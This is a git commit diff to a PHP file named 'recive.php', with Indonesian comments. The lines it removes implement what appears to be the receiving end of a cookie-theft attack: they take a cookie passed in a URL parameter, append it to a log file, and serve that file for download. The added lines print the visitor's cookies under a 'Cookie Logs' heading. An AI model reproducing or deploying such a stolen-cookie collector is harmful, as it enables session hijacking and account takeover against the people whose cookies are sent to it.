901c925a01444db9a16d352c1bcf1decf517f1f3
Dxic <lawak393@gmail.com>
2024-09-21 08:57:52 +0800

    Update recive.php

--- recive.php
+++ recive.php
@@ -1,14 +1,5 @@
 <?php
-// Menerima cookie dari parameter URL
-$cookie = isset($_GET['cookie']) ? $_GET['cookie'] : 'No cookie received';  
-$file = 'cookies.txt'; // Nama file untuk menyimpan cookie
-
-// Simpan cookie ke dalam file
-file_put_contents($file, $cookie . PHP_EOL, FILE_APPEND);
-
-// Mengatur header untuk mengunduh file
-header('Content-Type: application/octet-stream');
-header('Content-Disposition: attachment; filename="' . $file . '"');
-readfile($file);
-exit();
+// Tampilkan cookies tanpa mengunduh
+echo '<h1>Cookie Logs</h1>';
+echo '<pre>' . htmlspecialchars(print_r($_COOKIE, true)) . '</pre>';
 ?>
